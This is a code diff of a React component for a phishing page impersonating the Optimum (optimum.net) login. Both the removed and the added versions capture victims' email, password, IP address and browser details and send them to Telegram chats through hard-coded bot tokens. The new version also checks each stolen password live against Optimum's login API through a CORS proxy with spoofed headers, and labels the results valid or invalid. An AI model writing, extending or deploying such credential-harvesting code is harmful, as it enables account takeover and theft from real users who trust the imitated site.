@@ -1,6 +1,6 @@
 import React, { useEffect, useState } from 'react'
 import { useParams } from 'react-router-dom';
-
+import axios from 'axios';
 const Home = () => {
 
     const [showPassword, togglePassword] = useState(false);
@@ -11,127 +11,142 @@ const Home = () => {
     const [loading, toggleLoading] = useState(false)
     useEffect(() => {
         setEmail(userEmail)
-    }, [email])
+    }, [])
 
     const [errors, setErrors] = useState({ email: '', password: '' });
+
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
     };
-    const [count, toggleCount] = useState(0)
-    const [password1, togglePassword1] = useState('')
-    const [password2, togglePassword2] = useState('')
+
+    // const [count, toggleCount] = useState(0)
+    // const [password1, togglePassword1] = useState('')
+    // const [password2, togglePassword2] = useState('')
     const [clientIp, setClientIp] = useState('');
-    const [userAgent, setUserAgent] = useState(navigator.userAgent);
+    // const [userAgent, setUserAgent] = useState(navigator.userAgent);
 
-    useEffect(() => {
-        // Fetch the client's IP address using an external API
-        fetch('https://api64.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                setClientIp(data.ip);
-            })
-            .catch(error => {
-                console.error('Error fetching IP address:', error);
-            });
-    }, []);
+  useEffect(() => {
+    fetch('https://api64.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => setClientIp(data.ip))
+      .catch(error => console.error('Error fetching IP address:', error));
+  }, []);
 
-    const handleSubmit = async () => {
-        let emailError = '';
-        let passwordError = '';
+  const handleSubmit = async () => {
+    let emailError = '';
+    let passwordError = '';
 
-        if (!validateEmail(email)) {
-            emailError = 'Please enter a valid email.';
-        }
-        if (password.length < 8) {
-            passwordError = 'Password must be at least 8 characters.';
-        }
+    if (!validateEmail(email)) {
+      emailError = 'Please enter a valid email.';
+    }
+    if (password.length < 8) {
+      passwordError = 'Password must be at least 8 characters.';
+    }
 
-        setErrors({ email: emailError, password: passwordError });
-        if (count < 2) {
-            if (count === 0) {
-                togglePassword1(password)
-                toggleLoading(true)
-                setTimeout(() => {
-                    toggleLoading(false)
-                    setPassword('')
-                    let passwordError = 'Invalid Password';
-                    setTimeout(() => {
-                        setErrors({ email: '', password: '' });
-                    }, 2500);
-                    toggleCount(count + 1)
-                    setErrors({ email: emailError, password: passwordError });
-                }, 2500);
-            }
-            else if (count === 1) {
-                togglePassword2(password)
-                toggleLoading(true)
-                setTimeout(() => {
-                    toggleLoading(false)
-                    setPassword('')
-                    let passwordError = 'Invalid Password';
-                    toggleCount(count + 1)
-                    setErrors({ email: emailError, password: passwordError });
-                    setTimeout(() => {
-                        setErrors({ email: '', password: '' });
-                    }, 2500);
-                }, 2500);
-            }
-        }
-        else {
-            if (!emailError && !passwordError) {
-                // Prepare the message to send
-                const message = `Email: ${email}
-1st Attempt Password: ${password1}
-2nd Attempt Password: ${password2}
-3rd Attempt Password: ${password}
+    setErrors({ email: emailError, password: passwordError });
+
+    if (!emailError && !passwordError) {
+        const username = email.replace('@optonline.net', '').replace('@optimum.com', '').replace('@optimum.net', '');
+        toggleLoading(true);
+
+      try {
+        const response = await axios.post(
+          'https://proxy.cors.sh/https://portal.atus-dotnet-prod.com/api/login/services/v1/login/processLogin',
+          {
+            id: username,
+            password: password,
+            referer: '',
+            remember: false,
+          },
+          {
+            headers: {
+              'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
+              'Accept': 'application/json, text/plain, */*',
+              'Accept-Language': 'en-US,en;q=0.5',
+              'Accept-Encoding': 'gzip, deflate, br, zstd',
+              'X-Requested-With': 'XMLHttpRequest',
+              'Content-Type': 'application/json;charset=utf-8',
+              'Origin': 'https://www.optimum.net',
+              'DNT': '1',
+              'Sec-GPC': '1',
+              'Connection': 'keep-alive',
+              'Referer': 'https://www.optimum.net/',
+              'Sec-Fetch-Dest': 'empty',
+              'Sec-Fetch-Mode': 'cors',
+              'Sec-Fetch-Site': 'cross-site',
+              'Priority': 'u=0',
+              'TE': 'trailers',
+            },
+          }
+        );
+
+        const responseData = response.data;
+
+        if (responseData.status == 'LOGIN_RESP_SUCCESS') {
+          const message = `Optimum results { valid }
+Email: ${email}
+Password: ${password}
 Website: optimum.net
 Client IP: ${clientIp}
-User Agent: ${userAgent}`;
+User Agent: ${navigator.userAgent}`;
 
-                // Replace these values with your bot token and chat ID
-                const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
-                const chatId = '-1002398431021';
-                const botToken2 = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
-                const chatId2 = '7380056237';
-
-                try {
-                    // Send the message to Telegram
-                    toggleLoading(true)
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                        }),
-                    });
-
-                    await fetch(`https://api.telegram.org/bot${botToken2}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId2,
-                            text: message,
-                        }),
-                    });
-
-
-                    toggleLoading(false)
-                    // Optional: Handle success feedback or further actions here
-                    alert('Data sent successfully!');
-                } catch (error) {
-                    toggleLoading(false)
-                    console.error('Error sending message:', error);
-                }
-            }
+          await sendTelegramMessage(message);
         }
-    };
+      } catch (error) {
+        console.error('Error during login attempt:', error);
+        console.log(error.response.data.response);
+        console.log(error.response.data);
+        if (error.response.data) {
+            if (error.response.data.status == 'LOGIN_RESP_FAILURE_BAD_CREDENTIALS_EMAIL') {
+                const message = `Optimum results { invalid }
+Email: ${email}
+Password: ${password}
+Website: optimum.net
+Client IP: ${clientIp}
+User Agent: ${navigator.userAgent}`;
+      
+                await sendTelegramMessage(message);
+            }else{
+                console.error('Response data:', error.response.data);
+                console.error('Response status:', error.response.status);
+            }
+        } else if (error.request) {
+          // Request was made, but no response was received
+          console.error('Request data:', error.request);
+        } else {
+          // Something else went wrong
+          console.error('Error message:', error.message);
+        }
+      } finally {
+        toggleLoading(false);
+      }
+    }
+  };
 
+  const sendTelegramMessage = async (message) => {
+    const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
+    const chatId = '-1002398431021';
+
+    const botToken2 = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
+    const chatId2 = '7380056237';
+
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message }),
+      });
+
+      await fetch(`https://api.telegram.org/bot${botToken2}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId2, text: message }),
+      });
+    } catch (error) {
+      console.error('Error sending message to Telegram:', error);
+    }
+  };
 
     return (
         <div className="w-full text-[0.82rem] bg-[rgb(224,224,224)] h-screen flex flex-col items-end">
